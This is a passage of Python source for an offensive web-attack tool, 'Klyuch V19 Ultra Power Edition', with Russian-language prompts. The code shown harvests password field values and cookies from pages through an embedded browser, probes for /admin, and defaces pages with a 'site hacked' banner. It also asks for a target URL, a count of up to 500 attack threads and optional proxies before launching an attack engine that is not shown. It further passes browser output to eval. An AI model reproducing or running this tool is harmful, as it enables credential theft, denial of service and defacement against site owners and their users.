            js = "var p=[];document.querySelectorAll('input[type=password]').forEach(i=>{if(i.value)p.push(i.value)});return p"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "ПАРОЛИ", "\n".join(eval(d)) if d else "Не найдены"))
            self.log("🔑 Поиск паролей")
        
        def extract_links(self):
            js = "return Array.from(document.querySelectorAll('a')).map(a=>a.href).slice(0,100)"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "ССЫЛКИ", "\n".join(eval(d)[:50]) if d else "Не найдены"))
            self.log("🔗 Извлечение ссылок")
        
        def extract_cookies(self):
            js = "return document.cookie"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "COOKIES", d or "Не найдены"))
            self.log("🍪 Извлечение cookies")
        
        def find_admin(self):
            self.browser.setUrl(QUrl(self.browser.url().toString().rstrip('/') + "/admin"))
            self.log("🎯 Поиск админки")
        
        def screenshot(self):
            self.browser.grab().save("klyuch_screenshot.png")
            self.log("📸 Скриншот сохранён")
            QMessageBox.information(self, "Скриншот", "Сохранён как klyuch_screenshot.png")
        
        def save_page(self):
            js = "return document.documentElement.outerHTML"
            self.browser.page().runJavaScript(js, lambda h: open(f"klyuch_page_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html","w",encoding="utf-8").write(h))
            self.log("💾 Страница сохранена")
        
        def clear_site(self):
            self.browser.page().runJavaScript("document.body.innerHTML='<h1 style=color:red;text-align:center;margin-top:20%;>САЙТ ВЗЛОМАН ЧЕРЕЗ KLYUCH V19</h1>'")
            self.log("🗑️ Сайт очищен")

# ==================== ГЛАВНОЕ ПРИЛОЖЕНИЕ ====================
class KlyuchApp:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.target = None
        self.threads = 200
    
    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗  ██╗██╗  ██╗██╗   ██╗██╗   ██╗ ██████╗██╗  ██╗                        ║
║     ██║ ██╔╝██║  ██║██║   ██║██║   ██║██╔════╝██║  ██║                        ║
║     █████╔╝ ███████║██║   ██║██║   ██║██║     ███████║                        ║
║     ██╔═██╗ ██╔══██║██║   ██║██║   ██║██║     ██╔══██║                        ║
║     ██║  ██╗██║  ██║╚██████╔╝╚██████╔╝╚██████╗██║  ██║                        ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝                        ║
║                                                                               ║
║                    K L Y U C H   V 1 9                                       ║
║                    ULTRA POWER EDITION                                       ║
║                                                                               ║
║         ⚡⚡⚡ МАКСИМАЛЬНАЯ МОЩНОСТЬ | 500+ ПОТОКОВ | ПРОФЕССИОНАЛЬНЫЙ ОТЧЁТ ⚡⚡⚡║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}""")
    
    def run(self):
        self.banner()
        
        print(f"{Colors.BOLD}{Colors.GREEN}⚙️  НАСТРОЙКА УЛЬТРА-АТАКИ{Colors.END}")
        print(f"{Colors.CYAN}{'-'*55}{Colors.END}\n")
        
        self.target = input(f"{Colors.YELLOW}[?] Введите URL цели: {Colors.END}").strip()
        if not self.target.startswith(("http://", "https://")):
            self.target = "https://" + self.target
        
        print(f"\n{Colors.CYAN}[!] Мощность атаки (потоки):{Colors.END}")
        print(f"  {Colors.GREEN}1{Colors.END} - 100 (стандарт)")
        print(f"  {Colors.GREEN}2{Colors.END} - 200 (рекомендуется)")
        print(f"  {Colors.GREEN}3{Colors.END} - 350 (мощная)")
        print(f"  {Colors.GREEN}4{Colors.END} - 500 (максимум)")
        choice = input(f"{Colors.YELLOW}[?] Выбор (1-4): {Colors.END}").strip()
        choices = {'1': 100, '2': 200, '3': 350, '4': 500}
        self.threads = choices.get(choice, 200)
        
        print(f"\n{Colors.CYAN}[!] Прокси:{Colors.END}")
        if input(f"{Colors.YELLOW}[?] Использовать прокси? (y/n): {Colors.END}").lower() == 'y':
            self.proxy_manager.get_working_proxies()
        
        print(f"\n{Colors.GREEN}[ГОТОВО] Цель: {self.target}{Colors.END}")
        print(f"{Colors.GREEN}[ГОТОВО] Потоков: {self.threads}{Colors.END}")
        print(f"{Colors.GREEN}[ГОТОВО] Прокси: {len(self.proxy_manager.working_proxies)}{Colors.END}")
        
        input(f"\n{Colors.YELLOW}Нажмите Enter для ЗАПУСКА УЛЬТРА-АТАКИ...{Colors.END}")
        
        # Атака
        attack = UltraAttackEngine(self.target, self.proxy_manager, self.threads)
        results = attack.run()
        
        # Отчёт
        report_file = ProReportGenerator.generate(self.target, results, attack)
        
        # Редактор
        print(f"\n{Colors.YELLOW}[!] Запустить визуальный редактор? (y/n){Colors.END}")
        if input().lower() == 'y' and PYQT_OK:
            qt_app = QApplication(sys.argv)
            editor = WebEditor(self.target)
            editor.show()
            webbrowser.open(report_file)
            sys.exit(qt_app.exec_())
        else:
            webbrowser.open(report_file)
        
        print(f"\n{Colors.GREEN}[ЗАВЕРШЕНО] Ультра-атака выполнена!{Colors.END}")
        input(f"\n{Colors.YELLOW}Нажмите Enter для выхода...{Colors.END}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        app = KlyuchApp()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Прервано{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[ОШИБКА] {e}{Colors.END}")
        input("\nНажмите Enter...")
